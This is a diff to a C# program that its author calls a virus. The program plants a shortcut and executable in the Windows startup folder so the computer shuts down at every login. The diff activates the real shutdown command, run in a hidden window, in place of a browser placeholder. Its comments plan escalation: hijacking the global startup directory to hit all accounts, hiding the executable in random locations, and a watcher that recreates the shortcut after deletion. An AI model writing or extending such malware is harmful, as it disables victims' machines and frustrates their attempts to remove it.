@@ -25,6 +25,19 @@ using System.Diagnostics;
  | COUNTERMEASURES: RUN WINDOWS IN SAFE MODE AND NAVIGATE TO THE STARTUP FOLDER. DELETE THE
  |                  SHUTDOWN.LNK FILE.
  |
+ | IMPROVEMENTS: 1 - OVERRIDING PERMISSIONS ON THE GLOBAL STARTUP DIRECTORY AND INJECTING
+ |               THE SHUTDOWN.LNK FILE INTO IT WILL BE CATASTROPHIC TO A COMPUTER
+ |               AS PROGRAMS WITHIN THE GLOBAL DIRECTORY TAKES RUNNING PRECEDENCE 
+ |               OVER APPLICATIONS IN THE LOCAL STARTUP. THIS IMPLIES THAT ALL USER ACCOUNTS
+ |               WILL SHUTOFF WHEN LOGGED INTO!
+ |
+ |               2 - THERE IS NO NEED FOR SHUTDOWN.EXE TO BE PLACED WITHIN STARTUP DIR. IT'S JUST 
+ |               PREFERENTIAL TO HAVE BOTH FILES IN ONE LOCATION FOR NOW IN THE PREMATURE PHASE OF THIS SCRIPT. 
+ |               A BETTER DESIGN CAN BE CONSIDERED WHEN INTRODUCING RANDOM DIRECTORY PLACEMENT OF EXE FILE 
+ |               THERBY INCREASING THE DIFFICULTY TO DELETE BOTH AT ONCE.
+ |               HAVING BOTH FILES IN SEPERATE LOCATIONS ALLOWS FOR THE SHUTDOWN.EXE TO IMPLEMENT SOME 
+ |               LISTENER THAT MONITORS THE EXISTENCE OF THAT SHUTDOWN.LNK FILE AND RECREATE IT UPON IT'S DELETION.
+ |               THIS ROBUST FEATURE WILL ENSURE THE LONGEVITY OF THIS VIRUS.
  |
  |   Known Bugs:  N/A
  |
@@ -169,10 +182,10 @@ namespace WindowExecutables_v2._0
         public bool runTurnOffCMD()
         {
             Process myProcess = new Process();
-            myProcess.StartInfo.FileName = "iexplore.exe";
-            //myProcess.StartInfo.FileName = SHUTDOWN_CMD;
-            //myProcess.StartInfo.Arguments = SHUTDOWN_ARGS;
-            //myProcess.StartInfo.UseShellExecute = false;
+            //myProcess.StartInfo.FileName = "iexplore.exe";
+            myProcess.StartInfo.FileName = SHUTDOWN_CMD;
+            myProcess.StartInfo.Arguments = SHUTDOWN_ARGS;
+            myProcess.StartInfo.UseShellExecute = false;
             myProcess.StartInfo.CreateNoWindow = true;
             try
             {
